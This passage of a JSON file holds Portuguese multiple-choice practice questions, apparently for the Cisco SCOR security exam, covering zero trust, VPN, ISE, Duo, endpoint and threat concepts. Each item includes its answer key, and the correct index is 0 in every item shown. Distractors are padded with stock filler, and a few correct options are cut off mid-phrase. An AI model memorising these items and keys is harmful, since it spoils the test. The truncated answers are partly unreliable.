    "explanation": "As falhas na cloud resultam muitas vezes de chaves de API divulgadas ou APIs fracas que dão acesso amplo a armazenamento e computação.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.1"
  },
  {
    "question": "O que é um ataque de injeção de prompt contra um sistema de IA/LLM?",
    "options": [
      "Criar entrada que sobrescreve as instruções do modelo para o fazer vazar dados ou agir mal",
      "Injetar SQL numa base de dados via um formulário na maioria dos ambientes de produção",
      "Inundar um concentrador VPN sem ferramentas adicionais na maioria dos ambientes de produção",
      "Sobrescrever o firmware da BIOS no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "A injeção de prompt cria entrada do utilizador que sequestra ou sobrescreve o system prompt, causando fuga de dados ou ações indesejadas.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.3"
  },
  {
    "question": "O que arrisca a 'fuga do system prompt' numa implementação de LLM?",
    "options": [
      "Expor instruções ocultas que revelam políticas ou segredos ao utilizador",
      "Perder o driver da GPU segundo a prática comum em redes empresariais típicas",
      "Quebrar concessões DHCP sem ferramentas adicionais",
      "Desativar o syslog em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "Se um LLM revelar o seu system prompt oculto, os atacantes conhecem políticas, instruções de ferramentas ou segredos aí embutidos.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.3"
  },
  {
    "question": "Porque se está a tornar a criptografia pós-quântica (PQC) relevante para arquitetos de segurança?",
    "options": [
      "Computadores quânticos grandes podem quebrar algoritmos de chave pública muito usados",
      "A PQC torna o Wi-Fi mais rápido sem ferramentas adicionais segundo a prática comum",
      "A PQC substitui cabos Ethernet segundo a prática comum em redes empresariais típicas",
      "A PQC elimina a necessidade de MFA em redes empresariais típicas quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "Os algoritmos PQC são concebidos para resistir a ataques de computadores quânticos de grande escala que poderiam quebrar RSA e ECC.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "cripto",
    "domain": "1.5"
  },
  {
    "question": "O que é o MASQUE no transporte cifrado moderno?",
    "options": [
      "Um conjunto de mecanismos HTTP/3 para fazer proxy de tráfego sobre QUIC",
      "Uma variante de spanning-tree da Camada 2 sem ferramentas adicionais",
      "Um ID de evento do Windows no dia a dia das operações quando não existem outros controlos",
      "Um atributo RADIUS para VLANs em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O MASQUE (Multiplexed Application Substrate over QUIC Encryption) define proxy HTTP/3 para o tráfego ser retransmitido de forma segura sobre QUIC.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "cripto",
    "domain": "1.5"
  },
  {
    "question": "Que tecnologia VPN da Cisco constrói overlays IPsec hub-and-spoke ou spoke-to-spoke com NHRP?",
    "options": [
      "DMVPN",
      "GETVPN",
      "Apenas portal SSL sem cliente",
      "L2TP sem IPsec"
    ],
    "correct": 0,
    "explanation": "O DMVPN usa mGRE e NHRP para construir overlays VPN IPsec escaláveis hub-and-spoke (e spoke-to-spoke).",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "1.6"
  },
  {
    "question": "O que fornece sobretudo o GETVPN numa WAN empresarial?",
    "options": [
      "Tráfego cifrado em grupo sobre uma WAN privada sem túneis por par",
      "Portal cativo de Wi-Fi de convidados em parques de vários fabricantes",
      "Filtragem de spam de email quando não existem outros controlos",
      "Cifra de disco nos endpoints quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O GETVPN usa chaves de grupo GDOI para que os sites numa WAN privada cifrem o tráfego sem construir túneis individuais por par.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "1.6"
  },
  {
    "question": "Qual é o princípio central de uma arquitetura zero trust?",
    "options": [
      "Nunca confiar, verificar sempre — autenticar e autorizar cada pedido",
      "Confiar em todo o tráfego dentro da LAN corporativa",
      "Desativar os registos para reduzir custos segundo a prática comum",
      "Abrir todas as portas para facilitar o suporte em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O zero trust assume que não há confiança implícita pela localização na rede; cada pedido de acesso é autenticado, autorizado e avaliado continuamente.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "risco",
    "domain": "1.8"
  },
  {
    "question": "O que é o Cisco SAFE nas discussões de arquitetura de segurança?",
    "options": [
      "Um guia de desenho para arquiteturas seguras nos vários locais da rede",
      "Uma norma de cores de cabos no dia a dia das operações",
      "Um número de opção DHCP sem ferramentas adicionais no dia a dia das operações",
      "Um valor de community BGP quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O Cisco SAFE fornece orientação de desenho e fluxos de negócio para construir arquiteturas seguras no campus, WAN, centro de dados e cloud.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "risco",
    "domain": "1.9"
  },
  {
    "question": "Ao escolher entre capacidades de IPS e de firewall, o que acrescenta sobretudo um IPS?",
    "options": [
      "Inspeção profunda para detetar e bloquear padrões de exploits/malware no tráfego permitido",
      "Apenas filtragem de MAC na Camada 2 quando não existem outros controlos",
      "Apenas atribuição de endereços DHCP no dia a dia das operações",
      "Apenas teste de cabos durante janelas de manutenção de rotina em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "As firewalls aplicam política de permitir/negar; o IPS inspeciona o tráfego permitido em busca de padrões de exploits e malware e pode bloqueá-los.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "2.1"
  },
  {
    "question": "Que controlo da Camada 2 ajuda a impedir servidores DHCP rogue num switch Cisco?",
    "options": [
      "DHCP snooping",
      "Apenas STP PortFast",
      "LLDP",
      "CDP segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "O DHCP snooping constrói uma tabela de ligações de confiança e descarta respostas DHCP de portas não confiáveis, bloqueando servidores DHCP rogue.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "O que usa a Dynamic ARP Inspection (DAI) para validar pacotes ARP?",
    "options": [
      "A base de dados de ligações do DHCP snooping",
      "A tabela de encaminhamento BGP",
      "O stratum do NTP segundo a prática comum",
      "A community string do SNMP sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "A DAI verifica o ARP face à tabela de ligações do DHCP snooping e descarta pacotes ARP que não correspondam a ligações de confiança.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "Porque usam as equipas de segurança os CIS Benchmarks para equipamentos como Secure Firewall (FTD) e IOS XE?",
    "options": [
      "Fornecem recomendações consensuais de hardening",
      "Substituem a necessidade de qualquer autenticação",
      "Definem apenas planos de canais Wi-Fi",
      "Regulam o termóstato do escritório"
    ],
    "correct": 0,
    "explanation": "Os CIS Benchmarks oferecem linhas de base de hardening consensuais e independentes do fabricante que reduzem más configurações comuns em equipamentos de rede e segurança.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "risco",
    "domain": "2.5"
  },
  {
    "question": "Na resolução de problemas de AAA, como diferem sobretudo TACACS+ e RADIUS na administração de equipamentos?",
    "options": [
      "O TACACS+ separa auth/author/acct e cifra o payload completo",
      "O RADIUS usa sempre TCP 49; o TACACS+ usa UDP 1812",
      "São idênticos em tudo no dia a dia das operações",
      "O TACACS+ não pode autorizar comandos na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "O TACACS+ (TCP) cifra o pacote inteiro e separa as funções AAA, sendo preferido para administração de equipamentos; o RADIUS cifra sobretudo o campo da password.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "2.6"
  },
  {
    "question": "Que protocolo deve substituir o SNMPv1/v2c na gestão segura de equipamentos?",
    "options": [
      "SNMPv3 com autenticação e privacidade",
      "Telnet durante janelas de manutenção de rotina",
      "HTTP sem TLS",
      "TFTP no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "O SNMPv3 acrescenta autenticação e cifra (authPriv), ao contrário das communities em texto simples do SNMPv1/v2c.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "2.7"
  },
  {
    "question": "No Cisco Secure Firewall (FTD), o que permitem as regras de Access Control Policy com AVC e filtragem de URL?",
    "options": [
      "Permitir/bloquear com base na aplicação e categoria de URL",
      "Apenas filtragem de endereço MAC",
      "Apenas NAT estático na maioria dos ambientes de produção",
      "Apenas filtragem de rotas OSPF durante janelas de manutenção de rotina"
    ],
    "correct": 0,
    "explanation": "O Access Control do FTD pode corresponder a aplicações (AVC) e categorias de URL, permitindo permitir/bloquear com base na intenção para além das 5-tuplas.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "2.8"
  },
  {
    "question": "Que cliente é comummente usado com o Cisco Secure Firewall para VPN de acesso remoto?",
    "options": [
      "Cisco Secure Client (antigo AnyConnect)",
      "Apenas um cliente TFTP quando não existem outros controlos",
      "Apenas HyperTerminal quando não existem outros controlos",
      "Apenas um cliente DHCP"
    ],
    "correct": 0,
    "explanation": "O Cisco Secure Client (AnyConnect) fornece VPN de acesso remoto (e outros módulos) a headends Secure Firewall / ASA.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "2.9"
  },
  {
    "question": "Quando um túnel VPN IPsec no FTD falha ao estabelecer, que passo é mais útil primeiro?",
    "options": [
      "Verificar propostas, identidades, encaminhamento e mensagens de debug/registo para falhas de Fase 1/2",
      "Substituir imediatamente todos os cabos Ethernet sem ferramentas adicionais na maioria dos ambientes de produção",
      "Desativar os registos sem ferramentas adicionais em redes empresariais típicas",
      "Mudar o SSID do escritório durante janelas de manutenção de rotina no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "As falhas de estabelecimento de túnel são normalmente desfasamento de propostas IKE, problemas de identidade/PSK/certificado ou encaminhamento; verificar registos/debugs de Fase 1 vs Fase 2.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "2.10"
  },
  {
    "question": "No Modelo de Responsabilidade Partilhada da cloud para IaaS, quem endurece tipicamente o SO convidado?",
    "options": [
      "O cliente",
      "Apenas o fornecedor da cloud",
      "Ninguém",
      "O ISP"
    ],
    "correct": 0,
    "explanation": "Em IaaS o fornecedor protege o hipervisor e as instalações; o cliente é responsável pelo SO convidado, apps e dados.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.1"
  },
  {
    "question": "Para que serve sobretudo o Cisco Secure Workload (antigo Tetration)?",
    "options": [
      "Microsegmentação e visibilidade de workloads com base em fluxos de aplicação observados",
      "Páginas de boas-vindas de Wi-Fi de convidados durante janelas de manutenção de rotina",
      "Certificação de cabos no dia a dia das operações quando não existem outros controlos",
      "Assinaturas de email segundo a prática comum em redes empresariais típicas quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O Secure Workload mapeia dependências de aplicações e aplica políticas de microsegmentação em workloads no centro de dados e na cloud.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.4"
  },
  {
    "question": "Porque pode um desenho ao nível SCOR enviar registos de segurança da cloud para o Splunk?",
    "options": [
      "Para centralizar a monitorização e a correlação entre fontes cloud e on-prem",
      "Para apagar automaticamente os registos da cloud na maioria dos ambientes de produção",
      "Para substituir o IAM sem ferramentas adicionais",
      "Para atribuir IPs privados em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "Ingerir registos da cloud no Splunk (ou SIEM semelhante) permite deteção e investigação unificadas em ambientes híbridos.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Para que se usa comummente o eBPF na segurança moderna de workloads?",
    "options": [
      "Observabilidade e política programáveis e seguras ao nível do kernel sem carregar módulos clássicos",
      "Substituir certificados TLS sem ferramentas adicionais na maioria dos ambientes de produção",
      "Atribuir VLANs em switches de acesso quando não existem outros controlos sem ferramentas adicionais",
      "Desenhar diagramas de rede sem ferramentas adicionais no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "O eBPF corre programas em sandbox no kernel para observabilidade e política de segurança de alto desempenho em workloads Linux modernos.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.6"
  },
  {
    "question": "Em que se foca a segurança de Infrastructure as Code (IaC) no DevSecOps?",
    "options": [
      "Analisar templates e pipelines em busca de más configurações antes da implementação",
      "Pintar armários de servidores durante janelas de manutenção de rotina",
      "Escolher cadeiras de secretária no dia a dia das operações na maioria dos ambientes de produção",
      "Definir o brilho do monitor na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "A segurança de IaC analisa Terraform/CloudFormation/etc. e pipelines CI em busca de omissões inseguras antes de a infraestrutura ser implementada.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "risco",
    "domain": "3.7"
  },
  {
    "question": "Como difere o Security Service Edge (SSE) do conceito mais amplo de SASE?",
    "options": [
      "O SSE são os serviços de segurança (SWG, CASB, ZTNA)",
      "O SSE é só uma firewall; o SASE é só Wi-Fi",
      "São termos de marketing idênticos sem diferença técnica",
      "O SSE substitui totalmente a Ethernet segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "O SSE cobre segurança entregue na cloud (SWG, CASB, ZTNA, FWaaS); o SASE combina isso com a rede WAN (tipicamente SD-WAN).",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "4.1"
  },
  {
    "question": "O que protege sobretudo o Cisco Secure Access Secure Internet Access?",
    "options": [
      "O acesso dos utilizadores à Internet pública com controlos de segurança entregues na cloud",
      "Apenas o tráfego east-west dentro de um único rack no dia a dia das operações sem ferramentas adicionais",
      "Apenas portas de consola série segundo a prática comum sem ferramentas adicionais",
      "Apenas cabos submarinos sem ferramentas adicionais em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O Secure Internet Access aplica controlos estilo SWG/CASB aos utilizadores que navegam na Internet pública via Cisco Secure Access.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "4.2"
  },
  {
    "question": "Sobre o que é sobretudo o Secure Private Access (SPA) no Cisco Secure Access?",
    "options": [
      "Acesso zero-trust a aplicações privadas sem expor toda a rede",
      "Abrir todas as portas na firewall quando não existem outros controlos",
      "Desativar o MFA quando não existem outros controlos",
      "Ligar todas as VLANs em bridge no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "O SPA fornece acesso estilo ZTNA a apps privadas específicas, reduzindo a necessidade de colocar os utilizadores em toda a rede corporativa.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "4.3"
  },
  {
    "question": "Porque configurar DLP e guardrails de IA no Secure Internet Access?",
    "options": [
      "Para impedir a saída de dados sensíveis e limitar o uso arriscado de ferramentas de IA",
      "Para aumentar a velocidade de transferência durante janelas de manutenção de rotina",
      "Para atribuir endereços IP sem ferramentas adicionais quando não existem outros controlos",
      "Para reiniciar os pontos de acesso todas as noites sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "O DLP impede a exfiltração de dados sensíveis via web/SaaS; os guardrails de IA limitam prompts ou destinos arriscados em ferramentas de IA generativa.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "4.4"
  },
  {
    "question": "O que ajudam as pontuações Investigate do Cisco Secure Access um analista a compreender?",
    "options": [
      "Quão arriscado parece um destino ou domínio com base em threat intelligence",
      "A temperatura física de um router no dia a dia das operações",
      "O comprimento de um cabo de patch em redes empresariais típicas",
      "O brilho de um LED quando não existem outros controlos durante janelas de manutenção de rotina"
    ],
    "correct": 0,
    "explanation": "As pontuações Investigate resumem o risco de threat intel de domínios/destinos para os analistas priorizarem bloqueios e investigações.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "logs-ir",
    "domain": "4.5"
  },
  {
    "question": "Como diferem sobretudo EPP e EDR?",
    "options": [
      "O EPP foca-se na prevenção",
      "O EPP só cifra discos; o EDR só imprime registos",
      "São o mesmo acrónimo em parques de vários fabricantes",
      "O EDR substitui a necessidade de qualquer firewall de rede"
    ],
    "correct": 0,
    "explanation": "As plataformas de proteção de endpoints enfatizam a prevenção (AV); o EDR acrescenta telemetria, deteção, investigação e capacidades de resposta.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.1"
  },
  {
    "question": "Para que serve a avaliação de postura do endpoint antes de conceder acesso à rede?",
    "options": [
      "Verificar se o dispositivo cumpre os requisitos de segurança (atualizações",
      "Medir a velocidade de escrita do utilizador em redes empresariais típicas",
      "Contar separadores abertos do browser em redes empresariais típicas segundo a prática comum",
      "Escolher um fundo de ambiente de trabalho sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "A avaliação de postura verifica a saúde do dispositivo (atualizações, cifra, estado do AV) e pode pôr em quarentena dispositivos não conformes.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.3"
  },
  {
    "question": "Para que serve sobretudo o Cisco Secure Malware Analytics (Threat Grid)?",
    "options": [
      "Detonação em sandbox e análise de malware com threat intelligence",
      "Atribuir IDs de processo OSPF sem ferramentas adicionais segundo a prática comum",
      "Desenhar plantas de piso quando não existem outros controlos",
      "Configurar orçamentos PoE quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O Secure Malware Analytics detona e analisa amostras numa sandbox e enriquece os resultados com threat intelligence.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.4"
  },
  {
    "question": "Ao configurar o Cisco Secure Endpoint, qual é um objetivo principal?",
    "options": [
      "Implementar o conector e as políticas para prevenir e detetar malware nos hosts",
      "Substituir o switch de núcleo durante janelas de manutenção de rotina",
      "Desativar todas as portas USB para sempre sem política no dia a dia das operações",
      "Desligar sempre a análise na cloud quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O Secure Endpoint implementa conectores e políticas de prevenção, deteção e resposta contra malware nos endpoints.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.5"
  },
  {
    "question": "Um analista revê um evento de deteção de malware do Cisco Secure Endpoint. O que deve examinar primeiro?",
    "options": [
      "Hash do ficheiro, caminho, linhagem do processo e disposição para decidir isolamento ou permitir",
      "Apenas a cor do portátil quando não existem outros controlos em parques de vários fabricantes",
      "Apenas o tipo de letra favorito do utilizador durante janelas de manutenção de rotina segundo a prática comum",
      "Apenas o tempo de concessão DHCP em parques de vários fabricantes no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "Os eventos de deteção incluem hash, caminho, processo-pai e disposição; isso guia se isolar, remediar ou afinar um falso positivo.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.6"
  },
  {
    "question": "Contra o que protege sobretudo o Cisco Security Email Threat Defense?",
    "options": [
      "Ameaças de email malicioso e phishing com deteção e remediação",
      "Loops na Camada 2 durante janelas de manutenção de rotina",
      "Sobrecarga PoE em parques de vários fabricantes",
      "Desfasamentos de TTL de DNS quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O Email Threat Defense foca-se em detetar e remediar phishing e malware entregues por email.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.7"
  },
  {
    "question": "No Cisco ISE, em que ajuda sobretudo o profiling?",
    "options": [
      "Identificar tipos de dispositivo para a política tratar impressoras",
      "Aumentar a potência de transmissão Wi-Fi",
      "Comprimir o NetFlow sem ferramentas adicionais",
      "Escolher as cores dos racks durante janelas de manutenção de rotina"
    ],
    "correct": 0,
    "explanation": "O profiling do ISE classifica endpoints (impressora, telefone IP, PC) a partir de sondas de rede para que as políticas de autorização conheçam o tipo de dispositivo.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "O que verifica tipicamente a verificação de conformidade do dispositivo antes do acesso completo à rede?",
    "options": [
      "Se o endpoint cumpre os requisitos de postura de segurança",
      "Se o utilizador gosta do fundo de ecrã",
      "Se a secretária é ajustável quando não existem outros controlos",
      "Se o rato é sem fios em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "As verificações de conformidade/postura confirmam atualizações, cifra de disco, AV e controlos semelhantes antes de conceder acesso completo.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.2"
  },
  {
    "question": "O que fornece o MAB (MAC Authentication Bypass) quando o 802.1X não é possível?",
    "options": [
      "Autenticação de recurso usando o endereço MAC do dispositivo",
      "Autenticação mútua completa por certificado sem ferramentas adicionais",
      "Apenas DNS cifrado no dia a dia das operações",
      "Peering BGP automático em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "O MAB autentica endpoints que não fazem 802.1X (impressoras, algum IoT) pelo endereço MAC, normalmente com acesso limitado.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.3"
  },
  {
    "question": "Para que serve o Change of Authorization (CoA) com o ISE?",
    "options": [
      "Alterar dinamicamente a autorização de uma sessão (por exemplo quarentena) sem esperar novo login",
      "Mudar o hostname do equipamento durante a noite durante janelas de manutenção de rotina em redes empresariais típicas",
      "Rodar as fases das PDUs do rack no dia a dia das operações em redes empresariais típicas",
      "Atualizar a cor da parede em parques de vários fabricantes quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O CoA permite ao ISE impor um novo estado de autorização a meio da sessão, por exemplo pôr em quarentena um host não conforme.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.4"
  },
  {
    "question": "Que técnica encapsula dados dentro de consultas DNS para contornar firewalls típicas?",
    "options": [
      "Tunneling DNS",
      "STP root guard",
      "Port security sticky MAC",
      "LLDP-MED"
    ],
    "correct": 0,
    "explanation": "O tunneling DNS codifica dados em consultas/respostas DNS, muitas vezes permitidas pelas firewalls, para C2 ou exfiltração.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "6.5"
  },
  {
    "question": "O que fornecem sobretudo em conjunto o Cisco XDR e plataformas SIEM/SOAR estilo Splunk?",
    "options": [
      "Deteção entre domínios",
      "Apenas gestão de cabos na maioria dos ambientes de produção",
      "Apenas orçamentação PoE",
      "Apenas planeamento de canais Wi-Fi"
    ],
    "correct": 0,
    "explanation": "O XDR correlaciona telemetria de vários domínios; plataformas SIEM/SOAR como o Splunk acrescentam pesquisa, conteúdo de deteção e resposta automatizada.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "logs-ir",
    "domain": "6.6"
  },
  {
    "question": "Num desenho zero-trust, o que verifica sobretudo o Cisco Duo Device Trust?",
    "options": [
      "Que o dispositivo que autentica é um endpoint gerido e saudável",
      "Que o cabo Ethernet é Cat6 quando não existem outros controlos",
      "Que o monitor suporta 4K em parques de vários fabricantes",
      "Que a cadeira tem apoio lombar quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O Duo Device Trust verifica o estado de saúde/gestão do dispositivo como parte das decisões de acesso adaptativo numa arquitetura zero-trust.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.7"
  },
  {
    "question": "O que ajuda o Duo Trust Monitor as equipas de segurança a notar?",
    "options": [
      "Padrões de autenticação invulgares que podem indicar tomada de conta",
      "A temperatura do UPS em redes empresariais típicas segundo a prática comum",
      "O comprimento dos troços de fibra sem ferramentas adicionais",
      "O número de painéis de patch na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "O Trust Monitor destaca autenticações anómalas (nova localização, viagem impossível, novo dispositivo) que podem assinalar compromisso de conta.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.7"
  },
  {
    "question": "Como ajuda o Splunk a gerir e automatizar eventos de segurança num SOC alinhado com SCOR?",
    "options": [
      "Pesquisar, correlacionar e despoletar ações de resposta sobre dados de segurança à escala",
      "Substituir todas as firewalls por consultas de pesquisa no dia a dia das operações",
      "Atribuir áreas OSPF sem ferramentas adicionais quando não existem outros controlos",
      "Configurar apenas EtherChannel quando não existem outros controlos em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O Splunk ingere e pesquisa dados de segurança à escala e, com SOAR/automação, pode despoletar ações de resposta a partir das deteções.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "logs-ir",
    "domain": "6.8"
  },
  {
    "question": "Que problema relacionado com OWASP envolve enganar o browser do utilizador para fazer pedidos autenticados indesejados?",
    "options": [
      "Cross-site request forgery (CSRF)",
      "Apenas injeção de SQL",
      "ARP spoofing segundo a prática comum",
      "Ataque STP na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "O CSRF abusa da sessão autenticada do browser para o browser da vítima enviar pedidos indesejados que alteram estado.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Que controlo reduz melhor os cliques bem-sucedidos em phishing?",
    "options": [
      "Formação de sensibilização mais MFA e defesa contra ameaças de email",
      "Desativar todo o email em redes empresariais típicas na maioria dos ambientes de produção",
      "Remover o DNS sem ferramentas adicionais no dia a dia das operações",
      "Desligar todos os registos durante janelas de manutenção de rotina"
    ],
    "correct": 0,
    "explanation": "Os controlos anti-phishing em camadas combinam formação de sensibilização, MFA (limita o impacto da reutilização de credenciais) e filtragem de segurança de email.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "1.4"
  },
  {
    "question": "O que permite sobretudo a partilha de security intelligence entre organizações?",
    "options": [
      "Reconhecer mais depressa indicadores maus conhecidos entre pares",
      "Ciclos de atualização mais lentos quando não existem outros controlos",
      "Partilhas administrativas abertas no dia a dia das operações",
      "TLS desativado no dia a dia das operações"
    ],
    "correct": 0,
    "explanation": "Partilhar threat intelligence (IoCs, TTPs) permite aos pares bloquear e detetar atividade má conhecida mais depressa do que trabalhando isolados.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "risco",
    "domain": "1.7"
  },
  {
    "question": "O que ajusta sobretudo o Duo Adaptive Access com base em sinais de risco?",
    "options": [
      "Os requisitos de autenticação",
      "A prioridade de root do STP",
      "O temporizador hello do OSPF",
      "A classe de potência PoE segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "As políticas de Adaptive Access sobem ou descem a força da autenticação (ou negam) com base em sinais de risco como novo dispositivo ou localização invulgar.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.7"
  },
  {
    "question": "Para que serve o Cisco Security Cloud Control na gestão de equipamentos de segurança?",
    "options": [
      "Gestão centralizada na cloud de vários equipamentos e políticas de segurança",
      "Apenas desenhar diagramas de racks sem ferramentas adicionais",
      "Apenas vender cabos quando não existem outros controlos durante janelas de manutenção de rotina",
      "Apenas configurar modems analógicos sem ferramentas adicionais"
    ],
    "correct": 0,
    "explanation": "O Security Cloud Control (antigo CDO) fornece gestão centralizada na cloud de vários equipamentos de segurança Cisco.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "2.4"
  },
  {
    "question": "Porque é o HTTPS um canal comum de exfiltração?",
    "options": [
      "É amplamente permitido e o payload cifrado esconde o conteúdo de inspeção simples",
      "É sempre bloqueado por omissão quando não existem outros controlos",
      "Não consegue transportar ficheiros na maioria dos ambientes de produção",
      "Só funciona em impressoras quando não existem outros controlos segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "O HTTPS é normalmente permitido de saída e a cifra oculta o que está a ser transferido, salvo haver inspeção TLS ou DLP no endpoint.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "6.5"
  }
];
